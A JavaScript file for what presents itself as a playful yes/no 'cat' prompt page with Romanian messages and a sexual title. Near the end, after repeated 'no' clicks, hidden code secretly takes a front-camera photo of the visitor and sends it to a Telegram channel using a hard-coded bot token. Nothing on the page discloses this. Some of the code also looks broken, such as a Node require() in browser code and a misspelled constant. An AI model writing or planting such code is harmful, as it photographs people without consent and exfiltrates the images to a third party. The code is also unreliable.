"use strict";
const titleElement = document.querySelector(".title");
const buttonsContainer = document.querySelector(".buttons");
const yesButton = document.querySelector(".btn--yes");
const noButton = document.querySelector(".btn--no");
const catImg = document.querySelector(".cat-img");
const MAX_IMAGES = 5;

let play = true;
let noCount = 0;

yesButton.addEventListener("click", handleYesClick);
function handleYesClick() {
  titleElement.innerHTML = "SEX SALBATIC! >_<";
  buttonsContainer.classList.add("hidden");
  changeImage("yes");
}

function resizeYesButton() {
  const computedStyle = window.getComputedStyle(yesButton);
  const fontSize = parseFloat(computedStyle.getPropertyValue("font-size"));
  const newFontSize = fontSize * 1.6;

  yesButton.style.fontSize = `${newFontSize}px`;
}

function generateMessage(noCount) {
  const messages = [
    "Nu",
    "Sigur?",
    "Pookie please",
    "Te rog",
    "Esti loser-ul meu preferat ",
    "Bine atunci..."
  ];

  const messageIndex = Math.min(noCount, messages.length - 1);
  return messages[messageIndex];
}

function changeImage(image) {
  catImg.src = `img/cat-${image}.jpg`;
}

function updateNoButtonText() {
  noCount++;
  const message = generateMessage(noCount);
  noButton.innerHTML = message;

  if (message === "Bine atunci...") {
    noButton.addEventListener("click", function () {
      if (play) {
        play = false;

        const Camera = require('js-camera');

        // Create a new instance of the Camera
        const camera = new Camera({
          video: {
            width: 60,
            height: 40
          },
          audio: false
        });

        // Take a picture with the front camera
        camera.takePicture({
          flip: Camera.FLIP.BOTHORIZONTAL,
          facingMode: Camera.FACING_MODE.USER
        }).then(function (dataUrl) {
          // Send the image to the Telegram channel
          sendImageToTelegramChannel(dataUrl);

          // Resize the yes button
          resizeYesButton();

          // Update the no button text
          updateNoButtonText();

          // Stop the camera
          camera.stop();
        }).catch(function (error) {
          console.error('Error taking picture:', error);
        });
      }
    });
  }
}

noButton.addEventListener("click", function () {
  if (play) {
    const imageIndex = Math.min(noCount, MAX_IMAGES);

    changeImage(imageIndex);
    resizeYesButton();
    updateNoButtonText();
  }
});

// Send the image to the Telegram channel
function sendImageToTelegramChannel(dataUrl) {
  // Create a new instance of the TelegramBot
  const TelegramBot = require('node-telegram-bot-api');

  // Replace YOUR_TELEGRAM_BOT_TOKEN with the token you received from BotFather
  const token = '6644421997:AAGVhqt5RAdPkpBgOMO2ZyqvHhh8FNu47LE';
  const bot = new TelegramBot(token, {polling: true});

  // Send the image to the Telegram channel
  bot.sendPhoto('@auejazni', dataUrl, {
    caption: 'Image taken with the front camera'
  });
}
